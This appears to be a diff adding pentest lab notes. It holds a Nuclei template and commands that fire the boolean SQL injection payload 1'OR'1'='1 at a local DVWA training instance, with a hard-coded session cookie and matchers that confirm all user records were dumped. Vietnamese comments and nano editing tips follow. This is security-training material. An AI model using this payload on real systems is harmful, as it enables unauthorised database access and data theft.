@@ -1,0 +1,78 @@
+nuclei -t ~/pentest/dvwa/templates/SQL_TuTuXinhXich.yaml \
+       -u http://localhost:4280 \
+       -v
+
+
+SQLI: 1'OR'1'='1
+
+
+mkdir -p ~/pentest/dvwa/templates
+
+nano ~/pentest/dvwa/templates/SQL_TuTuXinhXich.yaml
+
+cat ~/pentest/dvwa/templates/SQL_TuTuXinhXich.yaml
+
+
+id: SQL_TuTuXinhXich
+
+info:
+  name: DVWA SQL Injection - Boolean Based OR 1=1
+  author: duc-hung
+  severity: high
+  description: |
+    DVWA SQLi endpoint vulnerable to Boolean-based SQL Injection.
+    Payload 1'OR'1'='1 dumps all 5 records from users table.
+  tags: dvwa,sqli,boolean,lab
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/vulnerabilities/sqli/?id=1%27OR%271%27%3D%271&Submit=Submit"
+
+    headers:
+      Cookie: "PHPSESSID=d7b2332f69736b873dbdb1c5363b5cab; security=low"
+
+    matchers-condition: and
+    matchers:
+
+      # Xác nhận có kết quả trả về
+      - type: word
+        part: body
+        words:
+          - "First name"
+
+      # Xác nhận dump được nhiều user cùng lúc
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "Gordon"
+          - "Pablo"
+          - "Bob"
+        condition: and      # Tất cả 4 user phải xuất hiện → chắc chắn dump thành công
+
+      - type: status
+        status:
+          - 200
+
+
+
+
+
+
+
+
+
+
+
+PHPSESSID:""
+
+
+Cách sửa Nuclei Template
+3 cách để sửa file YAML
+
+Cách 1: Dùng nano (đơn giản nhất)
+nano ~/pentest/dvwa/templates/SQL_TuTuXinhXich.yaml
+
+Ctrl + S Lưu file
+Ctrl + X Thoát
